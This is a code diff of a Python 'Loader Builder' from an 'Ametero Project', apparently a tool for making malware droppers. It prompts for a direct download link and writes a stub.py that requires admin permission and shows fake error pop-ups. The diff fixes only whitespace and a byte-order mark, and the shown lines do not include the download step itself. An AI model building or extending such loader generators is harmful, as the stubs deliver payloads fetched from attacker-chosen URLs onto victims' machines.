@@ -1,4 +1,4 @@
-﻿# Builded by Ametero for Ametero Project
+# Builded by Ametero for Ametero Project
 # Version : v0.1
 
 import os
@@ -33,7 +33,7 @@ if Zlatrotor == "1":
     if typeselect == "1":
         url_no_mask = input("Enter a URL of downloading file (Need a direct download link) : ")
         fp = open('stub.py', 'w')
-        fp.write('from tkinter import messagebox as mb')
+        fp.write('from tkinter import messagebox as mb\n')
         fp.write('# Used Loader Builder by Ametero for Ametero Project\n')
         fp.write('# https://t.me/ametero_project\n')
         fp.write("import os\n")
@@ -90,7 +90,7 @@ if Zlatrotor == "1":
             pass
         else:
             print_error("Incorrect Input")
-        fp.write("   else:\n")
+        fp.write("    else:\n")
         fp.write("     mb.showerror('Error!', 'Please connect to internet')\n")
         fp.write("else:\n")
         fp.write(" mb.showerror('Error!', 'Please start with admin permission')\n")
